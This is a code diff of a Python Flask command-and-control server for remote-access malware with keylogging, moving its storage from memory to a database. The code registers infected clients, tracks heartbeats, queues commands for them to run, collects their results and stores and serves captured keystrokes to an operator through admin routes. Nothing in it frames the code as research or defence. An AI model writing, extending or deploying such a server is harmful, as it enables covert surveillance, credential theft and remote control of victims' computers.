@@ -6,17 +6,31 @@ import os
 from config import ENCRYPTION_KEY
 from encryptor import Encryptor
 from protocol import Protocol
+from database import DatabaseManager
 
 
 app = Flask(__name__)
 
-# In-memory storage
-clients = {}
-pending_commands = {}
-command_results = {}
-keylogs_storage = {}
+# Initialize database
+db = DatabaseManager()
 
 encryptor = Encryptor(ENCRYPTION_KEY)
+
+
+def cleanup_old_data():
+    """Nettoyage périodique des anciennes données"""
+    while True:
+        try:
+            db.cleanup_old_data(days=30)
+            print(f"[CLEANUP] Old data cleaned up")
+            time.sleep(86400)  # Une fois par jour
+        except Exception as e:
+            print(f"[CLEANUP] Error: {e}")
+            time.sleep(3600)
+
+# Start cleanup thread
+cleanup_thread = threading.Thread(target=cleanup_old_data, daemon=True)
+cleanup_thread.start()
 
 
 @app.route('/')
@@ -72,16 +86,8 @@ def register_client():
 
         client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-        # Save client
-        clients[client_id] = {
-            'client_id': client_id,
-            'system_info': system_info,
-            'ip': client_ip,
-            'last_seen': time.time(),
-            'registered_at': time.time()
-        }
-        
-        print(f"[+] Client registered: {client_id} from {client_ip}")
+        # Save to database
+        db.get_or_create_client(client_id, system_info, client_ip)
 
         response_data = Protocol.create_success_message("Registered successfully!!!")
         encrypted_response = encryptor.encrypt(response_data)
@@ -132,16 +138,19 @@ def heartbeat():
         client_id = heartbeat_data.get('client_id')
 
         if client_id:
-            # Update heartbeat
-            if client_id in clients:
-                clients[client_id]['last_seen'] = time.time()
+            # Update heartbeat in database
+            if db.update_client_heartbeat(client_id):
                 res_msg = Protocol.create_success_message()
                 encrypted_response = encryptor.encrypt(res_msg)
-                return jsonify({"data": encrypted_response})
+                return jsonify({
+                    "data": encrypted_response
+                })
             else:
                 error_msg = Protocol.create_error_message("Client not found!")
                 encrypted_response = encryptor.encrypt(error_msg)
-                return jsonify({"data": encrypted_response}), 404
+                return jsonify({
+                    "data": encrypted_response,
+                }), 404
         else:
             error_msg = Protocol.create_error_message("No client_id provided!")
             encrypted_response = encryptor.encrypt(error_msg)
@@ -160,20 +169,16 @@ def heartbeat():
 
 @app.route('/admin/clients', methods=['GET'])
 def get_clients():
-    #Get list of all connected clients from memory
-    clients_list = list(clients.values())
+    #Get list of all connected clients from database
+    clients_list = db.get_all_clients()
     
-    # Add uptime and online status calculation
+    # Add uptime calculation
     current_time = time.time()
     for client in clients_list:
-        # Calculate uptime
-        if client.get('registered_at'):
-            client['uptime_seconds'] = current_time - client['registered_at']
+        if client.get('first_seen'):
+            client['uptime_seconds'] = current_time - client['first_seen']
         else:
             client['uptime_seconds'] = 0
-        
-        # Calculate online status (last seen < 60 seconds)
-        client['online'] = (current_time - client.get('last_seen', 0)) < 60
     
     print(f"[ADMIN] Returning {len(clients_list)} clients")
     return jsonify({
@@ -186,15 +191,16 @@ def get_clients():
 
 @app.route('/admin/status', methods=['GET'])
 def server_status():
-    current_time = time.time()
-    online_clients = sum(1 for c in clients.values() if current_time - c.get('last_seen', 0) < 60)
+    stats = db.get_statistics()
     
     return jsonify({
         "status": "online",
-        "total_clients": len(clients),
-        "online_clients": online_clients,
-        "total_commands": len(pending_commands) + len(command_results),
-        "pending_commands": sum(len(cmds) for cmds in pending_commands.values()),
+        "total_clients": stats['total_clients'],
+        "online_clients": stats['online_clients'],
+        "total_commands": stats['total_commands'],
+        "pending_commands": stats['pending_commands'],
+        "total_keylogs": stats['total_keylogs'],
+        "total_events": stats['total_events'],
         "server_time": datetime.now().isoformat(),
         "uptime_seconds": time.time() - app.start_time
     })
@@ -215,13 +221,7 @@ def send_process_command(client_id):
         command_id = f'cmd_{int(time.time() * 1000)}'
         
         # Save command to database
-        if client_id not in pending_commands:
-            pending_commands[client_id] = []
-        pending_commands[client_id].append({
-            'command_id': command_id,
-            'action': action,
-            'data': data
-        })
+        db.create_command(command_id, client_id, action, data)
         
         print(f"[PROCESS] Command queued for {client_id}: {action}")
         return jsonify({
@@ -238,7 +238,7 @@ def send_process_command(client_id):
 @app.route("/admin/command_result/<command_id>", methods=['GET'])
 def get_command_result(command_id):
     try:
-        result = command_results.get(command_id)
+        result = db.get_command_result(command_id)
         if result and result.get('status') == 'completed':
             return jsonify({"success": True, "result": result.get('result')})
         else:
@@ -268,7 +268,7 @@ def get_commands():
         print(f"[SERVER] Client {client_id} requesting commands")
         
         # Get pending commands from database
-        commands_obj = pending_commands.get(client_id, [])
+        commands_obj = db.get_pending_commands(client_id)
         commands = [{
             "command_id": cmd.command_id,
             "action": cmd.action,
@@ -325,11 +325,7 @@ def submit_command_result():
         
         if command_id and result is not None:
             # Update command result in database
-            command_results[command_id] = result
-            # Retirer de pending
-            for cid in pending_commands:
-                pending_commands[cid] = [c for c in pending_commands[cid] if c['command_id'] != command_id]
-            if True:
+            if db.update_command_result(command_id, result):
                 print(f"[SERVER] Successfully stored result for command {command_id}")
                 return jsonify({"success" : True})
             else:
@@ -376,18 +372,13 @@ def receive_keylog_data():
         print(f"[KEYLOG] Client: {client_id}, Logs count: {log_count}")
         
         if client_id and logs:
-            # Save to memory
-            if client_id not in keylogs_storage:
-                keylogs_storage[client_id] = []
-            keylogs_storage[client_id].extend(logs)
-            # Limiter à 1000 logs par client
-            keylogs_storage[client_id] = keylogs_storage[client_id][-1000:]
+            # Save to database
+            db.save_keylogs(client_id, logs)
             
             # Update client last_seen
-            if client_id in clients:
-                clients[client_id]['last_seen'] = time.time()
+            db.update_client_heartbeat(client_id)
             
-            total_logs = len(keylogs_storage[client_id])
+            total_logs = db.get_keylogs_count(client_id)
             
             print(f"[KEYLOG] ✅ Successfully stored {len(logs)} keylogs for client {client_id}")
             print(f"[KEYLOG] Total logs for {client_id}: {total_logs}")
@@ -415,8 +406,8 @@ def get_client_keylogs(client_id):
         limit = request.args.get('limit', 100, type=int)
         
         # Get keylogs from database
-        logs = keylogs_storage.get(client_id, [])[-limit:]
-        total_count = len(keylogs_storage.get(client_id, []))
+        logs = db.get_keylogs(client_id, limit)
+        total_count = db.get_keylogs_count(client_id)
         
         return jsonify({
             "success": True,
@@ -435,43 +426,83 @@ def get_client_keylogs(client_id):
 def get_keylogs_stats():
     
     try:
-        clients_with_logs = []
-        
-        clients_list = list(clients.values())
+        clients = db.get_all_clients()
+        stats = {}
         total_logs = 0
         
-        for client in clients_list:
+        for client in clients:
             client_id = client['client_id']
-            log_count = len(keylogs_storage.get(client_id, []))
+            log_count = db.get_keylogs_count(client_id)
             
             if log_count > 0:
                 # Get last log timestamp
-                logs_list = keylogs_storage.get(client_id, [])
-                last_log_time = logs_list[-1].get('timestamp', 'Unknown') if logs_list else "No logs"
+                logs = db.get_keylogs(client_id, limit=1)
+                last_log_time = logs[0]['timestamp'] if logs else "No logs"
                 
-                clients_with_logs.append({
-                    "client_id": client_id,
+                stats[client_id] = {
                     "log_count": log_count,
                     "last_log_time": last_log_time,
-                    "client_online": (time.time() - client.get('last_seen', 0)) < 60
-                })
+                    "client_online": client.get('online', False)
+                }
                 total_logs += log_count
         
         return jsonify({
             "success": True,
-            "total_clients_with_logs": len(clients_with_logs),
+            "total_clients_with_logs": len(stats),
             "total_logs_stored": total_logs,
-            "clients": clients_with_logs
+            "clients": stats
         })
     
     except Exception as e:
         return jsonify({"error": f"Failed to get keylog stats: {e}"}), 500
 
 
+# New admin routes for database insights
+@app.route("/admin/events", methods=["GET"])
+def get_events():
+    try:
+        client_id = request.args.get('client_id')
+        event_type = request.args.get('event_type')
+        limit = request.args.get('limit', 100, type=int)
+        
+        events = db.get_events(client_id=client_id, event_type=event_type, limit=limit)
+        
+        return jsonify({
+            "success": True,
+            "events": events,
+            "total_returned": len(events)
+        })
+    except Exception as e:
+        return jsonify({"error": f"Failed to get events: {e}"}), 500
+
+
+@app.route("/admin/commands_history", methods=["GET"])
+def get_commands_history():
+    try:
+        client_id = request.args.get('client_id')
+        
+        if client_id:
+            # Get all commands for a specific client
+            from database import Command
+            commands = db.session.query(Command).filter_by(client_id=client_id).order_by(Command.created_at.desc()).limit(50).all()
+        else:
+            # Get recent commands for all clients
+            from database import Command
+            commands = db.session.query(Command).order_by(Command.created_at.desc()).limit(100).all()
+        
+        return jsonify({
+            "success": True,
+            "commands": [cmd.to_dict() for cmd in commands],
+            "total_returned": len(commands)
+        })
+    except Exception as e:
+        return jsonify({"error": f"Failed to get commands history: {e}"}), 500
+
+
 @app.before_request
 def before_request():
-    online_count = sum(1 for c in clients.values() if time.time() - c.get('last_seen', 0) < 60)
-    print(f"[REQUEST] {request.method} {request.path} - Online: {online_count}/{len(clients)}")
+    stats = db.get_statistics()
+    print(f"[REQUEST] {request.method} {request.path} - Online: {stats['online_clients']}/{stats['total_clients']}")
 
 @app.after_request
 def after_request(response):
